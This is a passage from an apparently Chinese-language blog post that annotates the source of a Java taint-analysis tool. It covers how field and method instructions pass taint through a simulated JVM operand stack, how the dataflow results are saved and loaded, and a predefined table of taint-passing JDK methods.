class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> ClassReference.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                    isTransient = Boolean.TRUE;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 若读取的字段所属类可序列化</span></span><br><span class="line">                    ClassReference clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(owner));</span><br><span class="line">                    <span class="keyword">while</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 遍历类的所有字段</span></span><br><span class="line">                        <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                            <span class="comment">// 是否为目标字段</span></span><br><span class="line">                            <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                <span class="comment">// 是否被 transient 关键字修饰</span></span><br><span class="line">                                isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (isTransient != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 若找不到目标字段，则向上查找（超类）</span></span><br><span class="line">                        clazz = classMap.get(<span class="keyword">new</span> ClassReference.Handle(clazz.getSuperClass()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">// 能够传递污染的参数索引集合</span></span><br><span class="line">                Set&lt;Integer&gt; taint;</span><br><span class="line">                <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                    <span class="comment">// 若字段没有被 transient 修饰，则调用 TaintTrackingMethodVisitor.getStackTaint 读取栈顶</span></span><br><span class="line">                    <span class="comment">// 取出的是 this 或某实例对象，即字段所属实例</span></span><br><span class="line">                    taint = getStackTaint(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 否则为空</span></span><br><span class="line">                    taint = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 调用 TaintTrackingMethodVisitor.visitFieldInsn 进行出/入栈操作</span></span><br><span class="line">                <span class="keyword">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 调用 TaintTrackingMethodVisitor.setStackTaint 将栈顶设置为 taint</span></span><br><span class="line">                setStackTaint(<span class="number">0</span>, taint);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTFIELD:  <span class="comment">// 设置对象字段</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitFieldInsn 进行出/入栈操作</span></span><br><span class="line">    <span class="keyword">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br></pre></td></tr></table></figure><p><code>visitMethodInsn</code> 方法在方法调用方法时调用（绕口令呢😅）</p><ul><li>首先记录被调用方法的参数类型（列表），根据是否为静态方法添加第一个隐式参数（被调用方法所属类的实例对象）</li><li>然后记录被调用方法的返回值类型长度（0~2），用于最后存储索引集合</li><li>模拟被调用方法的操作数栈，如果是构造方法则认为隐式参数能够传递污染，如果被调用方法在已经分析的数据流信息中则直接取出相应的参数索引集合，保存到 <code>resultTaint</code> 变量中</li><li>调用父类方法 <code>TaintTrackingMethodVisitor.visitMethodInsn</code> 执行真正的出/入栈模拟，然后将参数索引集合存储到栈顶</li><li>最后根据被调用方法的返回值类型长度将 <code>resultTaint</code> 也合并到栈顶</li></ul><p>调用方法时会创建新的栈帧存储用到的相关数据，因此当调用到 <code>visitMethodInsn</code> 时会创建新的栈帧，其操作数栈中是被调用方法的参数（而不是当前方法）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc, <span class="keyword">boolean</span> itf)</span> </span>&#123;  <span class="comment">// 访问方法指令，方法指令是调用方法的指令。</span></span><br><span class="line">    <span class="comment">// 根据描述符得出被调用方法的参数类型（占用空间大小）</span></span><br><span class="line">    Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非静态方法的第一个参数是对象本身，即 this</span></span><br><span class="line">    <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;</span><br><span class="line">        Type[] extendedArgTypes = <span class="keyword">new</span> Type[argTypes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">        extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);    <span class="comment">// 对象类型</span></span><br><span class="line">        argTypes = extendedArgTypes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据描述符获取被调用方法的返回值类型大小</span></span><br><span class="line">    <span class="keyword">int</span> retSize = Type.getReturnType(desc).getSize();</span><br><span class="line">    <span class="comment">// 能够传递污染的参数索引集合</span></span><br><span class="line">    Set&lt;Integer&gt; resultTaint;</span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESTATIC:      <span class="comment">// 调用静态方法</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:     <span class="comment">// 调用实例方法</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESPECIAL:     <span class="comment">// 调用超类构造方法，实例初始化方法，私有方法</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:   <span class="comment">// 调用接口方法</span></span><br><span class="line">            <span class="comment">// 模拟操作数栈</span></span><br><span class="line">            <span class="keyword">final</span> List&lt;Set&lt;Integer&gt;&gt; argTaint = <span class="keyword">new</span> ArrayList&lt;Set&lt;Integer&gt;&gt;(argTypes.length);</span><br><span class="line">            <span class="comment">// 调用方法前先把操作数入栈</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                argTaint.add(<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 记录数据起始位置</span></span><br><span class="line">            <span class="keyword">int</span> stackIndex = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                Type argType = argTypes[i];</span><br><span class="line">                <span class="keyword">if</span> (argType.getSize() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// 根据参数类型的大小，调用 TaintTrackingMethodVisitor.getStackTaint 读取栈中的值</span></span><br><span class="line">                    <span class="comment">// 参数从右往左入栈，这里将参数值拷贝到 argTaint</span></span><br><span class="line">                    argTaint.set(argTypes.length - <span class="number">1</span> - i, getStackTaint(stackIndex + argType.getSize() - <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                stackIndex += argType.getSize();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果被调用的是构造方法，则认为被调用方法所属类的实例对象本身可以传递污染</span></span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// Pass result taint through to original taint set; the initialized object is directly tainted by</span></span><br><span class="line">                <span class="comment">// parameters</span></span><br><span class="line">                resultTaint = argTaint.get(<span class="number">0</span>);  <span class="comment">// 从栈顶取出对象，实际上是该对象的参数索引集合</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resultTaint = <span class="keyword">new</span> HashSet&lt;&gt;();  <span class="comment">// 否则初始化为空</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 经过逆拓扑排序，调用链末端的方法先被访问和判断，即被调用方法已经被判断过</span></span><br><span class="line">            <span class="comment">// 例如 A-&gt;B，判断 A 时 B 已经有判断结果了，并且此时栈中的数据是这样：B对象 B参数</span></span><br><span class="line">            Set&lt;Integer&gt; passthrough = passthroughDataflow.get(<span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(owner), name, desc));</span><br><span class="line">            <span class="comment">// 如果被调用方法存在能够传递污染的参数</span></span><br><span class="line">            <span class="keyword">if</span> (passthrough != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 遍历参数索引</span></span><br><span class="line">                <span class="keyword">for</span> (Integer passthroughDataflowArg : passthrough) &#123;</span><br><span class="line">                    <span class="comment">// 从栈中获取能够传递污染的参数索引集合，全部添加到 resultTaint</span></span><br><span class="line">                    resultTaint.addAll(argTaint.get(passthroughDataflowArg));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 TaintTrackingMethodVisitor.visitMethodInsn 执行出/入栈操作，根据预定义的判断规则分析参数索引集合</span></span><br><span class="line">    <span class="keyword">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回值不为空</span></span><br><span class="line">    <span class="comment">// 实例对象本身有可能传递污染，因此不能直接根据返回值判断（即不能最先执行这一块）</span></span><br><span class="line">    <span class="keyword">if</span> (retSize &gt; <span class="number">0</span>) &#123;  <span class="comment">// 1 或者 2</span></span><br><span class="line">        <span class="comment">// 调用 TaintTrackingMethodVisitor.getStackTaint 将 resultTaint 中的元素合并到参数索引集合中</span></span><br><span class="line">        <span class="comment">// 这里减 1 是因为在 TaintTrackingMethodVisitor.visitMethodInsn 中已经将第一个单位的值设置为其分析得到的参数索引集合</span></span><br><span class="line">        getStackTaint(retSize - <span class="number">1</span>).addAll(resultTaint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>save</code> 方法和 <code>load</code> 方法使用工厂方法实现数据的存取。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用工厂方法存储存储数据流信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (passthroughDataflow == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Save called before discover()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>), <span class="keyword">new</span> PassThroughFactory(), passthroughDataflow.entrySet());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从 passthrough.dat 加载数据流信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; load() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; entry : DataLoader.loadData(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>), <span class="keyword">new</span> PassThroughFactory())) &#123;</span><br><span class="line">        passthroughDataflow.put(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> passthroughDataflow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数据工厂接口实现</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PassThroughFactory</span> <span class="keyword">implements</span> <span class="title">DataFactory</span>&lt;<span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">MethodReference</span>.<span class="title">Handle</span>, <span class="title">Set</span>&lt;<span class="title">Integer</span>&gt;&gt;&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; parse(String[] fields) &#123;</span><br><span class="line">        ClassReference.Handle clazz = <span class="keyword">new</span> ClassReference.Handle(fields[<span class="number">0</span>]);</span><br><span class="line">        MethodReference.Handle method = <span class="keyword">new</span> MethodReference.Handle(clazz, fields[<span class="number">1</span>], fields[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">        Set&lt;Integer&gt; passthroughArgs = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String arg : fields[<span class="number">3</span>].split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arg.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                passthroughArgs.add(Integer.parseInt(arg));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> AbstractMap.SimpleEntry&lt;&gt;(method, passthroughArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; entry) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry.getValue().size() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String[] fields = <span class="keyword">new</span> String[<span class="number">4</span>];</span><br><span class="line">        fields[<span class="number">0</span>] = entry.getKey().getClassReference().getName();   <span class="comment">// 方法所属类的类名</span></span><br><span class="line">        fields[<span class="number">1</span>] = entry.getKey().getName();   <span class="comment">// 方法的名称</span></span><br><span class="line">        fields[<span class="number">2</span>] = entry.getKey().getDesc();   <span class="comment">// 方法的描述符</span></span><br><span class="line"></span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (Integer arg : entry.getValue()) &#123;</span><br><span class="line">            sb.append(Integer.toString(arg));</span><br><span class="line">            sb.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fields[<span class="number">3</span>] = sb.toString();  <span class="comment">// 参数索引</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> fields;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-TaintTrackingMethodVisitor"><a href="#6-TaintTrackingMethodVisitor" class="headerlink" title="6. TaintTrackingMethodVisitor"></a>6. TaintTrackingMethodVisitor</h2><p>继承 asm 的 MethodVisitor，模拟 JVM 内存结构，即本地变量表 <code>localVars</code> 和操作数栈 <code>stackVars</code>；重写了大量方法模拟调用参数时的出/入栈操作，用于进行污点分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SavedVariableState</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    List&lt;Set&lt;T&gt;&gt; localVars; <span class="comment">// 本地变量表</span></span><br><span class="line">    List&lt;Set&lt;T&gt;&gt; stackVars; <span class="comment">// 操作数栈</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SavedVariableState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        localVars = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        stackVars = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SavedVariableState</span><span class="params">(SavedVariableState&lt;T&gt; copy)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.localVars = <span class="keyword">new</span> ArrayList&lt;&gt;(copy.localVars.size());</span><br><span class="line">        <span class="keyword">this</span>.stackVars = <span class="keyword">new</span> ArrayList&lt;&gt;(copy.stackVars.size());</span><br><span class="line">        <span class="keyword">for</span> (Set&lt;T&gt; original : copy.localVars) &#123;</span><br><span class="line">            <span class="keyword">this</span>.localVars.add(<span class="keyword">new</span> HashSet&lt;&gt;(original));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Set&lt;T&gt; original : copy.stackVars) &#123;</span><br><span class="line">            <span class="keyword">this</span>.stackVars.add(<span class="keyword">new</span> HashSet&lt;&gt;(original));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">combine</span><span class="params">(SavedVariableState&lt;T&gt; copy)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; copy.localVars.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &gt;= <span class="keyword">this</span>.localVars.size()) &#123;</span><br><span class="line">                <span class="keyword">this</span>.localVars.add(<span class="keyword">new</span> HashSet&lt;T&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.localVars.get(i).addAll(copy.localVars.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; copy.stackVars.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &gt;= <span class="keyword">this</span>.stackVars.size()) &#123;</span><br><span class="line">                <span class="keyword">this</span>.stackVars.add(<span class="keyword">new</span> HashSet&lt;T&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.stackVars.get(i).addAll(copy.stackVars.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>预定义了一些数据流信息：类名，方法名，方法描述符，传递污染的参数索引。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[][] PASSTHROUGH_DATAFLOW = <span class="keyword">new</span> Object[][]&#123;</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Object&quot;</span>, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Taint from ObjectInputStream. Note that defaultReadObject() is handled differently below</span></span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream&quot;</span>, <span class="string">&quot;readObject&quot;</span>, <span class="string">&quot;()Ljava/lang/Object;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream&quot;</span>, <span class="string">&quot;readFields&quot;</span>, <span class="string">&quot;()Ljava/io/ObjectInputStream$GetField;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream$GetField&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pass taint from class name to returned class</span></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Object&quot;</span>, <span class="string">&quot;getClass&quot;</span>, <span class="string">&quot;()Ljava/lang/Class;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Class&quot;</span>, <span class="string">&quot;forName&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/Class;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pass taint from class or method name to returned method</span></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Class&quot;</span>, <span class="string">&quot;getMethod&quot;</span>, <span class="string">&quot;(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        <span class="comment">// Pass taint from class to methods</span></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Class&quot;</span>, <span class="string">&quot;getMethods&quot;</span>, <span class="string">&quot;()[Ljava/lang/reflect/Method;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/CharSequence;)V&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/Object;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/StringBuffer;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/CharSequence;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/CharSequence;II)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/io/ByteArrayInputStream&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;([B)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ByteArrayInputStream&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;([BII)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream&quot;</span>, 